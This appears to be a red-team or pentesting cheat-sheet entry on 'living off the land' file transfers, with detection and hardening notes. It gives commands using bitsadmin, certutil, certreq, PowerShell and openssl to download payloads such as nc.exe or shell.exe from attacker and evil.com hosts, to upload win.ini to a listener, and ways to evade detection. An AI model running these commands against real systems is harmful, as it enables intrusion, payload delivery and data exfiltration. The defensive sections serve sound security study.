notes: Find more: LOLBAS (/download /upload functions), GTFOBins (+file download / +file upload).
name: Living off the Land - LOLBin Transfers
description: Use trusted signed binaries already on the system to download files - blends into normal activity and dodges application allow-lists. LOLBAS (Windows) / GTFOBins (Linux) catalog them.

variations.label: bitsadmin / Start-BitsTransfer
variations.command:
bitsadmin /transfer wcb /priority foreground http://<lhost>:8000/nc.exe C:\Users\<user>\Desktop\nc.exe
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<lhost>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

variations.label: certreq upload
variations.command: certreq.exe -Post -config http://<lhost>:8000/ c:\windows\win.ini   # attacker: sudo nc -lvnp 8000

variations.label: Linux openssl (encrypted channel)
variations.command:
# attacker: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
#           openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /tmp/LinEnum.sh
# target:   openssl s_client -connect <ip>:80 -quiet > LinEnum.sh

defense.why_it_works: Living-Off-The-Land Binaries (certutil -urlcache, bitsadmin, GfxDownloadWrapper, etc.) are signed, trusted Windows tools with a side-effect of downloading files - so they slip past application whitelisting that would block unknown binaries (the module's scenario).
defense.prerequisites: Code execution on Windows and egress to the attacker host; a LOLBin present (most are built in).
defense.impact: Files downloaded using a trusted, whitelisted binary - bypassing application control that blocks custom tooling.
defense.detection: Each LOLBin has a signature: certutil's User-Agent is Microsoft-CryptoAPI, BITS is Microsoft BITS/7.8 (HTB M07); and a trusted binary making an outbound download to an external host is anomalous behaviour. 4688/Sysmon 1 command line (e.g. certutil -urlcache -f) is a high-fidelity indicator.
defense.artifacts: The LOLBin's distinctive UA in proxy logs; certutil/bitsadmin command line with a URL; the downloaded file (and certutil's urlcache).
defense.prevention: [MITRE T1105 M1037] Web filtering + domain whitelisting. Command-line deny-listing/alerting on known LOLBin download patterns (certutil -urlcache, bitsadmin /transfer); EDR behavioural rules; where feasible, block/monitor the LOLBins.
defense.evasion: LOLBins evade application whitelisting by design; spoof the UA and use HTTPS to reduce network signal; clear certutil's urlcache to limit artifacts.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
